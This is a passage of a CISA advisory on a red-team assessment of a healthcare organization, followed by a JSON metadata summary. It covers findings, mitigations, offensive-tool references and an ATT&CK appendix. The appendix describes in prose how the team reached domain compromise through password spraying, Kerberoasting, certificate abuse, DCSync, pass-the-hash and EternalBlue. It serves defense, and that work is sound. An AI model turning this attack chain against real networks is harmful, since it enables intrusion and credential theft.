they lost access to one of the vulnerable 
hosts, it could have led to domain 
compromise under the right circumstances. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 15 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
Cleartext 
Password 
Disclosure 
Medium 
Penetration 
Testing 
Storing passwords in cleartext is a security 
risk because malicious actors with access 
to these files can use them. 
The assessment team identified several 
unencrypted files on a file share containing 
passwords for various personal and 
organizational accounts. 
Insecure File 
Shares 
Medium 
Penetration 
Testing 
Access to sensitive data (e.g., data related 
to business functions, IT functions, and/or 
personnel) should be restricted to only 
certain authenticated and authorized users. 
The assessment team found an unsecured 
directory on a file share with sensitive IT 
information. The directory was accessible 
to all users in the domain group. Malicious 
actors with user privileges could access 
and/or exfiltrate this data. 
Additional Issues 
The CISA team identified one Informational severity within the organization’s networks and systems. 
These issues may allow a malicious actor to compromise the confidentiality, integrity, and availability 
of the tested environment, but are not readily exploitable. The information provided is to encourage 
the stakeholder to investigate these issues further to adjust their environments or eliminate certain 
aspects as needed, but the urgency is low. 
Table 5: Informational Issues That CISA Team Noted 
Issue 
Severity 
Service 
Description 
Overly Permissive 
Accounts 
  Informational  Penetration 
Testing 
Account privileges are intended to control 
user access to host or application resources 
to limit access to sensitive information in 
support of a least-privilege security model. 
When user (or other) accounts have high 
privileges, users can see and/or do things 
they normally should not, and malicious 
actors can exploit this to access host and 
application resources. 
The assessment team identified Active 
Directory objects where the Human 
Resources group appeared to be part of the 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 16 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
privileged Account Operators group. This 
may have provided elevated privileges to 
accounts in the Human Resources group. 
(The CISA team was unable to validate and 
demonstrate the potential impact of this 
relationship within the assessment period). 
Noted Strengths 
The CISA team noted the following business, technical, and administrative components that 
enhanced the network security posture of the tested environment: 
• 
The organization’s network was found to have several strong, security-oriented characteristics 
such as: 
o Effective antivirus software; 
o Endpoint detection and response capabilities; 
o Good policies and best practices for protecting users from malicious files including not 
allowing users to mount ISO files; 
o Minimal external attack surface, limiting an adversary’s ability to leverage external 
vulnerabilities to gain initial access to the organization’s networks and systems; 
o Strong wireless protocols; 
o And network segmentation. 
• 
The organization’s security also demonstrated their ability to detect some of the CISA team's 
actions throughout testing and overall situational awareness through the use of logs and 
alerts. 
• 
The organization used MFA for cloud accounts. The assessment team obtained cloud 
credentials via a phishing campaign but was unable to use them because of MFA prompts. 
MITIGATIONS 
Network Defenders 
CISA recommends HPH Sector and other critical infrastructure organizations implement the 
mitigations in Table 6 to mitigate the issues listed in the Findings section of this advisory. These 
mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA 
and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of 
practices and protections that CISA and NIST recommend all organizations implement. CISA and 
NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most 
common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector 
Cybersecurity Performance Goals for more information on the CPGs, including additional 
recommended baseline protections. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 17 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Table 6: Recommendations to Mitigate Identified Issues 
Issue 
Recommendation 
Poor Credential Hygiene: 
Easily Crackable Passwords  
• Follow National Institute of Standards and Technologies 
(NIST) guidelines when creating password policies to enforce 
use of “strong” passwords that cannot be cracked [CPG 2.B].[11] 
Consider using password managers to generate and store 
passwords. 
• Use “strong” passphrases for private keys to make cracking 
resource intensive [CPG 2.B]. Do not store credentials within the 
registry in Windows systems. Establish an organizational policy 
that prohibits password storage in files. 
• Ensure adequate password length (ideally 15+ characters) 
and complexity requirements for Windows service accounts 
and implement passwords with periodic expiration on these 
accounts [CPG 2.B]. Use Managed Service Accounts, when 
possible, to manage service account passwords automatically. 
Poor Credential Hygiene: 
Guessable Credentials 
• Do not reuse local administrator account passwords across 
systems. Ensure that passwords are “strong” and unique [CPG 
2.C]. 
• Use phishing-resistant multi-factor authentication (MFA) for 
all administrative access, including domain administrative 
access [CPG 2.H]. If an organization that uses mobile push-
notification-based MFA is unable to implement phishing-resistant 
MFA, use number matching to mitigate MFA fatigue. For more 
information, see CISA fact sheets on Implementing Phishing-
Resistant MFA and Implementing Number Matching in MFA 
Applications. 
Misconfigured ADCS 
Certificate Templates 
• Restrict enrollment rights in templates to only those users 
or groups that require it. Remove the Enrollee Supplies 
Subject flag from templates if it is not necessary or enforce 
manager approval if required. Consider removing Write Owner, 
Write DACL and Write Property permissions from low-
privilege groups, such as Authenticated Users where those 
permissions are not needed. 
Unnecessary Network 
Services Enabled 
• Ensure that only ports, protocols, and services with 
validated business needs are running on each system. 
Disable deprecated protocols (including NetBIOS, LLMNR, and 
mDNS) on the network that are not strictly necessary for 
business functions, or limit the systems and services that use the 
protocol, where possible [CPG 2.W]. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 18 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Recommendation 
• Disable the WebClient and Spooler services where possible to 
minimize risk of coerced authentication. 
• Disable ADCS web-enrollment services. If this service cannot 
be disabled, disable NTLM authentication to prevent malicious 
actors from performing NTLM relay attacks or abusing the 
Spooler and WebClient services to coerce and relay 
authentication to the web-enrollment service. 
Elevated Service Account 
Privileges 
• Run daemon applications using a non-Administrator 
account when appropriate.  
• Configure Service accounts with only the permissions 
necessary for the services they operate.  
• To mitigate Kerberoasting attacks, use AES or stronger 
encryption instead of RC4 for Kerberos hashes [CPG 2.K]. RC4 
is considered weak encryption. 
SMB Signing Not Enabled 
• Require SMB signing for both SMB client and server on all 
systems to prevent certain adversary-in-the-middle and pass-
the-hash attacks. See Microsoft’s Overview of Server Message 
Block signing for more information. 
Insecure Default 
Configuration: Default 
Credentials 
• Verify the implementation of appropriate hardening 
measures, and change, remove, or deactivate all default 
credentials [CPG 2.A]. 
• Before deploying any new devices in a networked environment, 
change all default passwords for applications, operating 
systems, routers, firewalls, wireless access points, and 
other systems to have values consistent with administration-
level accounts [CPG 2.A]. 
Poor Credential Hygiene: 
Password Reuse for 
Administrator and User 
Accounts 
• Discontinue reuse or sharing of administrative credentials 
among user/administrative accounts [CPG 2.C]. 
• Use unique credentials across workstations, when possible, 
in accordance with applicable federal standards, industry best 
practices, and/or agency-defined requirements.  
• Train users, especially privileged users, against password 
reuse [CPG 2.I]. 
Poor Credential Hygiene: 
Password Reuse for 
Administrator Accounts 
• Discontinue reuse or sharing of administrative credentials 
among systems [CPG 2.C]. When possible, use unique 
credentials across all workstations in accordance with applicable 
federal standards, industry best practices, and/or agency-defined 
requirements. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 19 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Recommendation 
• Implement a security awareness program that focuses on the 
methods commonly used in intrusions that can be blocked 
through individual action [CPG 2.I]. 
• Implement Local Administrator Password Solution (LAPS) 
where possible if your OS is older than Windows Server 2019 
and Windows 10 as these versions do not have LAPS built in. 
Note: The authoring organizations recommend organizations 
upgrade to Windows Server 2019 and Windows 10 or greater. 
Poor Patch Management: 
Out-of-Date Software 
• Enforce consistent patch management across all systems and 
hosts within the network environment [CPG 1.E]. 
• Where patching is not possible due to limitations, implement 
network segregation controls [CPG 2.F] to limit exposure of 
the vulnerable system or host. 
• Consider deploying automated patch management tools and 
software update tools for operating system and 
software/applications on all systems for which such tools are 
available and safe. 
Poor Patch Management: 
Unsupported OS or 
Application  
• Evaluate the use of unsupported hardware and software and 
discontinue where possible. If discontinuing the use of 
unsupported hardware and software is not possible, implement 
additional network protections to mitigate the risk. 
Use of Weak Authentication 
Measures 
• Require phishing-resistant MFA for all user accounts that 
have access to sensitive data or systems. If MFA is not 
possible, it is recommended to, at a minimum, configure a more 
secure password policy by aligning with guidelines put forth by 
trusted entities such as NIST [CPG 2.H]. 
PII Disclosure 
• Implement a process to review files and systems for 
insecure handling of PII [CPG 2.L]. Properly secure or remove 
the information. Conduct periodic scans of server machines using 
automated tools to determine whether sensitive data (e.g., 
personally identifiable information, health, credit card, or 
classified information) is present on the system in cleartext. 
• Encrypt PII and other sensitive data, and train users who 
handle sensitive data to utilize best practices for encrypting data 
and storing it securely. If sensitive data must be stored on shares 
or other locations, restrict access to these locations as much as 
possible through access controls and network segmentation 
[CPG 2.F, 2.K, 2.L]. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 20 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Recommendation 
Hosts with Unconstrained 
Delegation Enabled 
Unnecessarily 
• Remove Unconstrained Delegation from all servers. If 
Unconstrained Delegation functionality is required, upgrade 
operating systems and applications to leverage other approaches 
(e.g., configure Constrained Delegation, enable the Account 
is sensitive and cannot be delegated option) or explore 
whether systems can be retired or further isolated from the 
enterprise. CISA recommends Windows Server 2019 or greater. 
Cleartext Password 
Disclosure 
• Implement a review process for files and systems to look for 
cleartext account credentials. When credentials are found, 
remove or change them to maintain security [CPG 2.L]. 
• Conduct periodic scans of server machines using 
automated tools to determine whether sensitive data (e.g., 
personally identifiable information, health, credit card, or 
classified information) is present on the system in cleartext. 
Consider implementing a secure password manager solution in 
cases where passwords need to be stored [CPG 2.L]. 
Insecure File Shares 
• Restrict access to file shares containing sensitive data to 
only certain authenticated and authorized users [CPG 2.L]. 
Additionally, CISA recommends that HPH sector organizations implement the following strategies to 
mitigate cyber threats: 
• 
Mitigation Strategy #1 Asset Management and Security: 
o CISA recommends that HPH sector organizations implement and maintain an asset 
management policy to reduce the risk of exposing vulnerabilities, devices, or services that 
could be exploited by threat actors to gain unauthorized access, steal sensitive data, or 
disrupt critical services. The focus areas for this mitigation strategy include asset 
management and asset security, addressing asset inventory, procurement, 
decommissioning, and network segmentation as they relate to hardware, software, and 
data assets. 
• 
Mitigation Strategy #2 Identity Management and Device Security: 
o CISA recommends entities secure their devices and digital accounts and manage their 
online access to protect sensitive data and PII/PHI from compromise. The focus areas for 
this mitigation strategy include email security, phising prevention, access management, 
password policies, data protection and loss prevention, and device logs and monitoring 
solutions. 
• 
Mitigation Strategy #3 Vulnerability, Patch, and Configuration Management: 
o CISA recommends entities mitigate known vulnerabilities and establish secure 
configuration baselines to reduce the likelihood of threat actors exploiting known 
vulnerabilities to breach organizational networks. The focus areas for this mitigation 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 21 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
strategy include vulnerability and patch Management, and configuration and change 
management. 
For more information on these mitigations strategies, see CISA’s Healthcare and Public Health Sector 
webpage. 
Software Manufacturers 
The above mitigations apply to HPH sector and other critical infrastructure organizations with on-
premises or hybrid environments. Recognizing that insecure software is the root cause of the majority 
of these flaws, and that the responsibility should not be on the end user, CISA urges software 
manufacturers to implement the following to reduce the prevalence of misconfigurations, weak 
passwords, and other weaknesses identified and exploited through the assessment team: 
• 
Embed security into product architecture throughout the entire software development 
lifecycle (SDLC). 
• 
Eliminate default passwords. Do not provide software with default passwords. To eliminate 
default passwords, require administrators set a “strong” password [CPG 2.B] during 
installation and configuration. 
• 
Create secure configuration templates. Provide configuration templates with certain safe 
settings based on an organization’s risk appetite (e.g., low, medium, and high security 
templates). Support these templates with hardening guides based on the risks the 
manufacturer has identified. The default configuration should be a secure one, and 
organizations should need to opt in if they desire a less secure configuration. 
• 
Design products so that the compromise of a single security control does not result in 
compromise of the entire system. For example, narrowly provision user privileges by default 
and employ ACLs to reduce the impact of a compromised account. This will make it more 
difficult for a malicious cyber actor to escalate privileges and move laterally. 
• 
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a 
default, rather than opt-in, feature. 
These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity 
Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers 
to take ownership of improving the security outcomes of their customers by applying these and other 
secure by design tactics. By using secure by design tactics, software manufacturers can make their 
product lines secure “out of the box” without requiring customers to spend additional resources 
making configuration changes, purchasing security software and logs, monitoring, and making routine 
updates. 
For more information on secure by design, see CISA’s Secure by Design webpage. For more 
information on common misconfigurations and guidance on reducing their prevalence, see the joint 
advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. 
VALIDATE SECURITY CONTROLS 
In addition to applying the listed mitigations, CISA recommends exercising, testing, and validating 
your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 22 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Enterprise framework in this advisory. CISA recommends testing your existing security controls 
inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Tables 7 – 16). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
CISA recommends continually testing your security program, at scale, in a production environment to 
ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. 
RESOURCES 
• 
For consolidated findings from the RVAs by Fiscal Year mapped to MITRE ATT&CK, see 
CISA’s Risk and Vulnerability Assessments page. 
• 
See joint CSA NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity 
Misconfigurations for information on the most common cybersecurity misconfigurations in 
large organizations and TTPs actors use to exploit these misconfigurations. 
• 
See CISA’s Healthcare and Public Health Sector webpage. 
• 
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source 
analytic tool used to visualize and report red team command and control activities. See CISA’s 
RedEye tool overview video for more information. 
REFERENCES 
[1]   Github | kgretzky / evilginx 
[2]   Github | lgandx / Responder 
[3]   Network security LAN Manager authentication level - Windows Security | Microsoft Learn 
[4]   Service principal names - Win32 apps | Microsoft Learn 
[5]   Github | fortra / impacket 
[6]   Github | byt3bl33d3r / CrackMapExec 
[7]   Github | ly4k / Certipy 
[8]   Github | topotam / PetitPotam 
[9]   Github | fortra / impacket / examples 
[10] Github | login-securite / DonPAPI 
[11] SP 800-63B, Digital Identity Guidelines: Authentication and Lifecycle Management | CSRC 
(nist.gov) 
 
 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 23 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES 
Table 7: CISA Team ATT&CK Techniques for Reconnaissance 
Reconnaissance 
Technique Title 
ID 
Use 
Active Scanning: 
Scanning IP Blocks 
T1595.001 
The CISA team first mapped the network to identify open web 
ports. 
See Table 8 – 16 for all referenced threat actor tactics and techniques in this advisory. 
Table 8: CISA Team ATT&CK Techniques for Initial Access 
Initial Access 
Technique Title 
ID 
Use 
Valid Accounts: 
Default Accounts 
T1078.001 
The CISA team did identify default credentials for multiple web 
interfaces during web application testing and used default 
printer credentials while penetration testing. 
External Remote 
Services 
T1133 
The CISA team attempted to access various web interfaces 
with default administrator credentials. 
Table 9: CISA Team ATT&CK Techniques for Execution 
Execution 
Technique Title 
ID 
Use 
Command-Line 
Interface 
T1059 
The CISA team accessed a virtual machine interface enabling 
them to modify, power off, and/or delete critical virtual 
machines including domain controllers, file servers, and 
servers. 
Command and 
Scripting Interpreter: 
Windows Command 
Shell 
T1059.003 
The CISA team used a webshell that allowed them to execute 
commands under the context of the local SYSTEM account. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 24 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Table 10: CISA Team ATT&CK Techniques for Privilege Escalation 
Privilege Escalation 
Technique Title 
ID 
Use 
Valid Accounts: 
Domain Accounts 
T1078.002 
The CISA team used CrackMapExec to use ACCOUNT 1 to 
successfully connect to a domain controller (DC). 
Table 11: CISA Team ATT&CK Techniques for Defense Evasion 
Defense Evasion 
Technique Title 
ID 
Use 
Use Alternate 
Authentication 
Material 
T1550 
The CISA team authenticated to the domain controller as 
ACCOUNT 3 with the generated certificate. 
Table 12: CISA Team ATT&CK Techniques for Credential Access 
Credential Access 
Technique Title 
ID 
Use 
LLMNR/NBT-NS 
Poisoning and Relay 
T1557.001 
The CISA team initiated a LLMNR/NBT-NS/mDNS/DHCP 
poisoning tool to spoof a connection to the organization’s 
server for forced access.  
Brute Force: 
Password Cracking 
T1110.002 
The CISA team cracked a service account with a weak 
password, giving them access to it.  
Steal or Forge 
Kerberos Tickets: 
Kerberoasting 
T1558.003 
The CISA team gained access to domain accounts because 
any domain user can request a TGS ticket for domain 
accounts. 
Adversary-in-the-
Middle 
T1557 
The CISA team modified the “Save as file” configuration, to 
use File Transfer Protocol (FTP) instead of Server Message 
Block (SMB) and changed the Server Name and Network Path 
to point to a CISA-controlled machine running Responder. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 25 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Forced 
Authentication 
T1187 
The CISA team executed a “Connection Test” that sent the 
username and password over FTP. 
Steal or Forge 
Authentication 
Certificates 
T1649 
The CISA team used Certipy to enumerate the ADCS 
certificate template vulnerabilities, allowing them to obtain 
certificates for different users. 
OS Credential 
Dumping 
T1003 
The CISA team retrieved the NTLM hash for ACCOUNT 3. 
Use Alternate 
Authentication 
Material: Pass the 
Hash 
T1550.002 
The CISA team used the hash to authenticate to the domain 
controller and validated Domain Administrator privileges, 
demonstrating compromise of the domain. 
Brute Force: 
Password Spraying 
T1110.003 
The CISA team used a tool called CrackMapExec to spray 
easily guessable passwords across all domain accounts, 
giving them two sets of valid credentials.  
Steal or Forge 
Kerberos Tickets 
T1558 
The CISA team used this certificate to acquire a TGT for 
ACCOUNT 5. 
OS Credential 
Dumping: DCSync 
T1003.006 
The CISA team used DCSync to dump the NTLM hash for 
ACCOUNT 3 (a Domain Administrator account), effectively 
leading to domain compromise. 
OS Credential 
Dumping: Security 
Account Manager 
T1003.002 
The CISA team dumped password hashes from a Security 
Account Manager (SAM) database. 
Table 13: CISA Team ATT&CK Techniques for Discovery 
Discovery 
Technique Title 
ID 
Use 
Network Sniffing 
T1040 
The CISA team spoofed a response to direct the victim host to 
a CISA-controlled machine on which Responder is running.   
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 26 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Account Discovery: 
Domain Account 
T1087.002 
The CISA team enumerated accounts with a Service Principal 
Name (SPN) set with their domain access.  
Network Service 
Scanning 
T1046 
The CISA team canned the organization’s network to identify 
open web ports to see where they could leverage the default 
credentials they had. 
Table 14: CISA Team ATT&CK Techniques for Lateral Movement 
Lateral Movement 
Technique Title 
ID 
Use 
Remote Services 
T1021 
The CISA team exploited its Responder to perform malicious 
functions, such as stealing credentials or opening a session 
on a targeted host.  
 SMB/Windows 
Admin Shares 
T1021.002 
The CISA team confirmed they compromised the domain 
because ACCOUNT 1 had READ,WRITE permissions over the 
C$ administrative share. 
Taint Shared 
Content 
T1080 
The CISA team found the device was configured with domain 
credentials to allow employees to save scanned documents to 
a network share. 
Exploitation of 
Remote Services 
T1210 
The CISA team then executed a well-known EternalBlue 
exploit and established a shell on the server. 
Table 15: CISA Team ATT&CK Techniques for Collection 
Collection 
Technique Title 
ID 
Use 
Data from Network 
Shared Drive 
T1039 
The CISA team obtained credentials for cleartext, hashes, and 
from files.  
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 27 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Table 16: CISA Team ATT&CK Techniques for Impact 
Collection 
Technique Title 
ID 
Use 
System 
Shutdown/Reboot 
T1529 
The CISA team assessed that with ACCOUNT 1, they could 
use it to modify, power off, and/or delete critical virtual 
machines, including domain controllers and file servers. 
VERSION HISTORY 
December 14, 2023: Initial version. 
",Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment,"{
  ""ID"": ""AA23-349A"",
  ""URL"": ""https://www.cisa.gov/tlp"",
  ""Title"": ""Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment"",
  ""Release Date"": ""2023-12-15"",
  ""Last Updated"": ""2023-12-15"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""Healthcare and Public Health (HPH) organization's network systems""
  ],
  ""Summary"": ""This advisory provides key findings from a CISA-conducted Risk and Vulnerability Assessment for a large HPH sector organization, focused on identifying and mitigating cyber threats in both external and internal network environments."",
  ""Procedures"": {
    ""Internal Penetration Testing"": ""The CISA team identified multiple attack paths internal to the organization's network that comprised activities such as capturing credentials, exploiting misconfigurations, and accessing domain controllers to demonstrate substantial security vulnerabilities."",
    ""External Penetration Testing"": ""Demonstrated robust external defenses where significant threats from external sources were minimized, indicating effective perimeter security measures.""
  },
  ""Tactics"": {
    ""Initial Access"": ""Efforts to gain access were unsuccessful during external testing, demonstrating effective external defenses. However, internal testing revealed multiple tactics used for gaining unauthorized access."",
    ""Privilege Escalation"": ""Identifying and exploiting weak or default credentials and misconfigurations to gain higher privileges within the network."",
    ""Persistence"": ""Misconfigured ADCS certificate templates and insecure network services enabled persistent foothold and lateral movement capabilities.""
  },
  ""Techniques"": {
    ""Credential Dumping"": ""Uses of tools like Responder and CrackMapExec to capture, relay, and crack credentials."",
    ""Lateral Movement"": ""Exploitation of misconfigured services and protocols to gain deeper network access and escalate privileges."",
    ""Defense Evasion"": ""Using inherent network protocols and poorly configured services to maintain access without detection.""
  },
  ""Threat Actions"": [
    ""Establishing legitimate-looking but unauthorized access to internal systems."",
    ""Elevating privileges through cracked or guessed credentials."",
    ""Manipulating network protocols and services for data exfiltration and maintaining persistence.""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [
      ""Specific IPs not listed in the advisory""
    ],
    ""Domains"": [
      ""Specific domains not listed in the advisory""
    ],
    ""Hashes"": [
      ""Specific hashes not listed in the advisory""
    ]
  },
  ""Mitigation Strategies"": ""The advisories emphasize implementing robust credential policies, network segmentation, and stringent controls around service accounts and administrative credentials. It also recommends regular audits, multi-factor authentication, and disabling unnecessary services."",
  ""References"": [
    ""https://www.cisa.gov/tlp"",
    ""https://www.cisa.gov/healthcare-public-health-sector""
  ]
}"
